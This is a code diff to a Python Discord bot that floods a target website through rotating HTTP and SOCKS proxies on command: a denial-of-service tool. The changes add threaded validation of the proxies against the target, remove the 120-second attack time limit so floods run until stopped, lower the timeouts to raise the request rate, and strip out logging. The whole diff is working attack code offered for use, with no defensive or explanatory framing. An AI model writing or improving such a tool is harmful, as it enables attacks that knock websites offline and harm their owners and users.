@@ -38,7 +38,7 @@ referers = [
     "https://www.bing.com/search?q=",
 ]
 ind_dict = {}  # Tracks proxy request counts
-proxies = []   # List of proxies
+proxies = []   # List of working proxies
 target = ""
 path = "/"
 port = 80
@@ -46,38 +46,81 @@ protocol = "http"
 attack_active = False
 attack_thread = None
 channel = None
-start_time = 0
-duration = 0
 proxy_types = ["socks5", "socks4", "http"]  # Order to try proxy types
 
-# Proxy parsing
+# Proxy validation
+def validate_proxy(proxy, timeout=1):
+    """Validate a proxy by attempting a connection."""
+    ip, port = proxy.split(":")
+    port = int(port)
+    for proto in proxy_types:
+        try:
+            if proto == "http":
+                proxies_dict = {"http": f"http://{ip}:{port}", "https": f"http://{ip}:{port}"}
+                response = requests.get(f"{protocol}://{target}", proxies=proxies_dict, timeout=timeout)
+                if response.status_code:
+                    return proto
+            else:
+                s = socks.socksocket()
+                sock_type = socks.SOCKS4 if proto == "socks4" else socks.SOCKS5
+                s.set_proxy(sock_type, ip, port)
+                s.settimeout(timeout)
+                s.connect((target, port))
+                if protocol == "https":
+                    ctx = ssl.create_default_context()
+                    s = ctx.wrap_socket(s, server_hostname=target)
+                s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
+                s.close()
+                return proto
+        except:
+            if 's' in locals():
+                s.close()
+    return None
+
 def load_proxies():
-    """Load proxies from proxies.txt."""
+    """Load and validate proxies from proxies.txt."""
     global proxies
     proxies = []
     try:
         with open("proxies.txt", "r", encoding="utf-8") as f:
-            for line in f:
-                line = line.strip()
-                if line and ":" in line:
-                    proxies.append(line)
-        logging.info(f"Loaded {len(proxies)} proxies")
+            temp_proxies = [line.strip() for line in f if line.strip() and ":" in line]
+        logging.info(f"Found {len(temp_proxies)} proxies, validating...")
+        valid_proxies = []
+        threads = []
+        lock = threading.Lock()
+        def validate_and_append(proxy):
+            proto = validate_proxy(proxy)
+            if proto:
+                with lock:
+                    valid_proxies.append(proxy)
+        for proxy in temp_proxies:
+            th = threading.Thread(target=validate_and_append, args=(proxy,))
+            th.start()
+            threads.append(th)
+            if len(threads) >= 100:  # Limit concurrent validation threads
+                for th in threads:
+                    th.join()
+                threads = []
+        for th in threads:
+            th.join()
+        proxies = valid_proxies
+        logging.info(f"Loaded {len(proxies)} valid proxies")
         return len(proxies) > 0
     except FileNotFoundError:
         logging.error("proxies.txt not found")
         return False
 
 def get_proxy_session(proxy):
-    """Create a session for a proxy, trying each protocol."""
+    """Create a session for a proxy."""
     ip, port = proxy.split(":")
     port = int(port)
-    for proto in proxy_types:
-        if proto == "http":
-            return {"http": f"http://{ip}:{port}", "https": f"http://{ip}:{port}"}
-        elif proto == "socks4":
-            return (socks.SOCKS4, ip, port)
-        elif proto == "socks5":
-            return (socks.SOCKS5, ip, port)
+    proto = random.choice(proxy_types)  # Randomize to distribute load
+    if proto == "http":
+        return {"http": f"http://{ip}:{port}", "https": f"http://{ip}:{port}"}
+    elif proto == "socks4":
+        return (socks.SOCKS4, ip, port)
+    elif proto == "socks5":
+        return (socks.SOCKS5, ip, port)
     return None
 
 # HTTP utilities
@@ -132,7 +175,7 @@ def zeus(ind_rlock):
     global attack_active
     header = GenReqHeader()
     add = "&" if "?" in path else "?"
-    while attack_active and time.time() - start_time < duration:
+    while attack_active:
         proxy = random.choice(proxies)
         try:
             session = get_proxy_session(proxy)
@@ -146,7 +189,7 @@ def zeus(ind_rlock):
                         "Referer": random.choice(referers) + target + path
                     },
                     proxies=session,
-                    timeout=2
+                    timeout=0.5  # Ultra-low timeout for high RPS
                 )
                 if req.status_code:
                     with ind_rlock:
@@ -155,7 +198,7 @@ def zeus(ind_rlock):
                 sock_type, ip, port_num = session
                 s = socks.socksocket()
                 s.set_proxy(sock_type, ip, port_num)
-                s.settimeout(2)
+                s.settimeout(0.5)  # Ultra-low timeout
                 s.connect((target, port))
                 if protocol == "https":
                     ctx = ssl.create_default_context()
@@ -167,10 +210,10 @@ def zeus(ind_rlock):
                     with ind_rlock:
                         ind_dict[proxy] += 1
                 s.close()
-        except Exception as e:
+        except Exception:
             if isinstance(session, tuple) and 's' in locals():
                 s.close()
-            logging.debug(f"Proxy {proxy} failed: {e}")
+        time.sleep(0.001)  # Minimal delay to prevent CPU overload
 
 def build_threads(thread_num, ind_rlock):
     """Start attack threads."""
@@ -183,7 +226,7 @@ def build_threads(thread_num, ind_rlock):
         threads.append(th)
     attack_thread = threads
 
-# Monitoring and status updates
+# Monitoring
 async def monitor_site():
     """Monitor the target website for downtime."""
     global attack_active, channel
@@ -205,25 +248,6 @@ async def monitor_site():
         last_status = status
         await asyncio.sleep(5)
 
-async def update_status():
-    """Update attack status with timer."""
-    global attack_active, channel, start_time, duration
-    while attack_active and time.time() - start_time < duration:
-        remaining = int(duration - (time.time() - start_time))
-        embed = discord.Embed(
-            title="Attack In Progress",
-            description=(
-                f"**Target**: {target}\n"
-                f"**Time Remaining**: {remaining}s\n"
-                f"**Threads**: {len(attack_thread)}\n"
-                f"**RPS**: {sum(ind_dict.values())}"
-            ),
-            color=discord.Color.blue(),
-            timestamp=datetime.datetime.utcnow()
-        )
-        await channel.send(embed=embed)
-        await asyncio.sleep(10)
-
 # Bot commands
 @bot.event
 async def on_ready():
@@ -232,27 +256,23 @@ async def on_ready():
     print(f"Bot is ready! Logged in as {bot.user}")
 
 @bot.command()
-async def attack(ctx, website: str, duration_str: str, threads: str):
+async def attack(ctx, website: str, threads: str):
     """Start a DDoS attack with the specified parameters."""
-    global attack_active, channel, start_time, duration, ind_dict, attack_thread, target, protocol
+    global attack_active, channel, start_time, ind_dict, attack_thread, target, protocol
     if attack_active:
         await ctx.send("An attack is already in progress!")
         return
 
     # Validate inputs
     try:
-        duration = int(duration_str)
-        if duration > 120:
-            await ctx.send("Error: Duration must be ≤ 120 seconds.")
-            return
         thread_num = int(threads)
         if thread_num > 1000:
             await ctx.send("Error: Threads must be ≤ 1000.")
             return
-        if duration <= 0 or thread_num <= 0:
+        if thread_num <= 0:
             raise ValueError
     except ValueError:
-        await ctx.send("Error: Duration and threads must be positive integers.")
+        await ctx.send("Error: Threads must be a positive integer.")
         return
 
     # Prevent attacks on restricted domains
@@ -275,8 +295,7 @@ async def attack(ctx, website: str, duration_str: str, threads: str):
     # Initialize attack
     attack_active = True
     channel = ctx.channel
-    start_time = time.time()  # Use time module directly
-    duration = duration
+    start_time = time.time()
     ind_dict = {proxy: 0 for proxy in proxies}
     ind_rlock = threading.RLock()
 
@@ -285,7 +304,6 @@ async def attack(ctx, website: str, duration_str: str, threads: str):
         title="Attack Started",
         description=(
             f"**Target**: {target}\n"
-            f"**Duration**: {duration}s\n"
             f"**Threads**: {thread_num}\n"
             f"**Proxies**: {len(proxies)}"
         ),
@@ -297,18 +315,29 @@ async def attack(ctx, website: str, duration_str: str, threads: str):
     # Start attack and monitoring
     build_threads(thread_num, ind_rlock)
     asyncio.create_task(monitor_site())
-    asyncio.create_task(update_status())
 
-    # Wait for duration
-    await asyncio.sleep(duration)
-    attack_active = False
-    embed = discord.Embed(
-        title="Attack Stopped",
-        description=f"**Target**: {target}\n**Status**: Attack completed",
-        color=discord.Color.orange(),
-        timestamp=datetime.datetime.utcnow()
-    )
-    await ctx.send(embed=embed)
+    # Keep bot running until interrupted
+    try:
+        while attack_active:
+            await asyncio.sleep(1)
+    except KeyboardInterrupt:
+        attack_active = False
+        embed = discord.Embed(
+            title="Attack Stopped",
+            description=f"**Target**: {target}\n**Status**: Attack stopped manually",
+            color=discord.Color.orange(),
+            timestamp=datetime.datetime.utcnow()
+        )
+        await ctx.send(embed=embed)
+    except Exception as e:
+        attack_active = False
+        embed = discord.Embed(
+            title="Attack Stopped",
+            description=f"**Target**: {target}\n**Status**: Attack stopped due to error: {str(e)}",
+            color=discord.Color.red(),
+            timestamp=datetime.datetime.utcnow()
+        )
+        await ctx.send(embed=embed)
 
 # Run bot
 if __name__ == "__main__":
